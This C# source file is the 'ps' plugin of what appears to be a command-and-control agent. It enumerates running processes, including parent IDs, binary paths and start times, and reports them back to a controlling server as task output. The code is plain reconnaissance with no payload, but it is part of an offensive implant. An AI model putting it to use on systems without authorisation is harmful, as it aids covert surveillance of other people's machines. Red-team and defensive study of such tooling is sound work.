using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using ps;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "ps";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            try
            {
                List<ServerProcessInfo> processes = new List<ServerProcessInfo>();

                if (OperatingSystem.IsWindows())
                {
                    processes.AddRange(ProcessHelper.GetProcessesWithParent());
                }
                else
                {
                    processes.AddRange(convertProcessToServerProcess(Process.GetProcesses()));
                }

                await messageManager.AddResponse(new ProcessTaskResponse
                {
                    task_id = job.task.id,
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x2C" } },
                    processes = processes
                });

            }
            catch (Exception e)
            {
                await messageManager.AddResponse(new ProcessTaskResponse
                {
                    task_id = job.task.id,
                    completed = true,
                    user_output = e.ToString(),
                    processes = new List<ServerProcessInfo>()
                });
            }
        }
        private IEnumerable<string> GetTargetsFromFile(byte[] b)
        {
            string allData = Misc.GetEncoding(b).GetString(b);

            return allData.Split(Environment.NewLine);
        }

        private List<ServerProcessInfo> convertProcessToServerProcess(Process[] procs)
        {
            List<ServerProcessInfo> processes = new List<ServerProcessInfo>();

            foreach (var proc in procs)
            {
                try
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                        bin_path = proc.MainModule.FileName,
                        start_time = new DateTimeOffset(proc.StartTime).ToUnixTimeMilliseconds(),
                    });
                }
                catch
                {
                    processes.Add(new ServerProcessInfo()
                    {
                        process_id = proc.Id,
                        name = proc.ProcessName,
                        description = proc.MainWindowTitle,
                    });
                }
            }

            return processes;
        }
    }
}
